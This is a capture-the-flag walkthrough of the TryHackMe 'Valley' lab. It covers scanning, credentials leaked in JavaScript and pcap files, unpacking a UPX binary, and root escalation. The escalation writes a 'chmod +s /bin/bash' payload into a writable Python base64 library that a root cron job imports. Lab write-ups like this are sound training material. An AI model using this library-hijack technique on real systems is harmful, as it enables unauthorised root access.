---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Valley
# DESCRIPTION       . Can you find your way into the Valley?
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/valleype
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.96.224 -oN valley
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2842ac1225a10f16616dda0f6046295 (RSA)
|_  256 429e2ff63e5adb51996271c48c223ebb (ECDSA)

80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)

37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

#### PORT 80

- There wasn't any relevant information on the website itself.
- By looking at the source code of different page, I found the following endpoints.

```
/gallery
/static
/pricing
```

- I have decided to fuzz them all for potential hidden directories

- By fuzzing pricing, I found the following

```
J,
Please stop leaving notes randomly on the website
-RP
```

- By fuzzing static, I found another directory that is not linked in `/gallery`

```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /{redacted}
-check for SIEM alerts
```

- By navigating to the hidden directory, we find a login panel. 
- I wanted to try to bruteforce it using hydra, assuming `valleyDev` was the username.

- When I was inspecting the source page to get the form details for hydra, I noticed `dev.js` being linked to the page.

- This was a poorly written javascript login function that contained the credentials in plain text

```javascript
if (username === "siemDev" && password === "{REDACTED}") {
        window.location.href = "/{REDACTED}/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
```

- After using the credentials found in the script, I got the following note

```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

- Alright. So we know that the same credentials are working on the FTP server.

#### PORT 37370 

```
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 .
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 ..
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
```

- I've downloaded all files and inspected them using `Wireshark`. 

- `siemFTP.pcapng` contains just an anonymous login to the FTP server that is currently not available anymore. These were the files the user had access to.

```
-rw-r--r-- 1 0 0 0 Mar 06 13:27 AnnualReport.txt
-rw-r--r-- 1 0 0 0 Mar 06 13:27 BusinessReport.txt
-rw-r--r-- 1 0 0 0 Mar 06 13:27 CISOReport.txt
-rw-r--r-- 1 0 0 0 Mar 06 13:27 HrReport.txt
-rw-r--r-- 1 0 0 0 Mar 06 13:27 ItReport.txt
-rw-r--r-- 1 0 0 0 Mar 06 13:27 SecurityReport.txt
```

- All seem irelevant for our purpose here.

- `siemHTTP1` is just regular traffic and most of the `siemHTTP2` too, but from the latter we're able to extract multiple `.html` files.

- If we open them, one of them holds the credentials for `valleyDev`.

```
uname=valleyDev&psw={REDACTED}&remember=on
```

- The first flag can be found in `/home/valleyDev/user.txt`.

#### PRIVILEGE ESCALATION valleyDev -> valley

- A custom executable, `valleyAuthenticator`, is found in `/home`. 

- I couldn't use strings on the target server since it wasn't installed so I've transferred the file locally using a python htpp server.

- After that, I've used `strings` on it and I found multiple occurings of something called `UPX`.

- After reading some documentation, I've discovered that UPX is used to pack executables to reduce disk size, so this had to be unpacked.

- I've downloaded the binary from their github releases page and used the following command to unpack `valleyAuthenticatior`.

```
./upx -d -o output.elf valleyAuthenticator
```

- Now, I've used `strings` again on the output and this time I found more readable text

```
e6722920ba{REDACTED}e4bf6b1b58ac
dd2921cc76{REDACTED}09056cfb
Welcome to Valley Inc. Authenticator
What is your username: 
What is your password: 
Authenticated
```

- What got my attention was the following lines, as they looked like hashes.

- These two are MD5 hashes that have the credentials of user `valley`. 

#### PRIVILEGE ESCALATION valley -> root

```bash
id
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```

- We weren't part of `valleyAdmin` with the previous user.

- I continued my usual checks and I found the following in `/etc/crontab`

```
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```

```
-rwxr-xr-x 1 root root 621 Mar  6  2023 /photos/script/photosEncrypt.py
```

```python
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)
```

- But we don't have permission to modify this or to recreate the script in the directory as neither of them are owned by us.

- After a while I couldn't find anything else useful in particular so I've decided to look for unusual files using `find`.

- One of my checks was to see which files are owned by the group `valleyAdmin`.

```bash
find / -group valleyAdmin 2>/dev/null
```

```
/usr/lib/python3.8/base64.py
```

```
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
```

- `base64.py` is writable by us and is included in the script found in the crontab.
- This means that whatever we write in `base64.py` gets executed when the script runs.

```
#! /usr/bin/python3.8

import os
os.system("chmod +s /bin/bash")
```

- Then I've used `/bin/bash -p` to spawn a shell as `root`. 

- The last flag is in `/root/root.txt`.

